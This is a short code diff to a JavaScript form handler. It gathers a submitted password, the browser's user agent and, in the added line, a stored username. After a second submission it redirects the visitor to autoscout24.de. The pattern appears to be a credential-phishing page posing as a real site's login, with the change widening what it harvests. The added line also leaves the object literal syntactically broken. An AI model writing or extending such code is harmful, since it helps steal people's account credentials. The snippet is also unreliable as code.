@@ -85,8 +85,10 @@
               
     let formData = new FormData(e.target);
     alertBox.classList.remove('rr');
+    const user = JSON.parse(localStorage.getItem('usr'));
 
     formData = JSON.stringify({
+     username:user.username
       pass: formData.get('password'),
       agent: userAgent
     });
@@ -107,7 +109,6 @@
     console.log(formData)
     
     if (i >= 1) {
-      localStorage.setItem('usr', formData);
       window.location.href = 'https://www.autoscout24.de/';
     }
     i++;
